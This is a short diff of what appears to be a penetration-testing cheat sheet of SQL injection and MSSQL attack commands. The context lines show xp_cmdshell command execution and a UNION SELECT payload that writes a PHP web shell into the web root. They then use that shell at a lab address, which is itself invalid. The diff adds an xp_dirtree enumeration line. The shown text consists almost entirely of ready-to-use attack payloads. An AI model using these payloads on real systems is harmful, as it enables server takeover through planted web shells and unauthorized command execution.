@@ -1148,10 +1148,10 @@ EXECUTE xp_cmdshell 'whoami';
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
-```
-```powershell
+
 SELECT * FROM fn_my_permissions(NULL, 'SERVER');
 EXEC sp_linkedservers;
+EXEC xp_dirtree 'C:\inetpub\wwwroot', 10, 1;
 ```
 
 ---
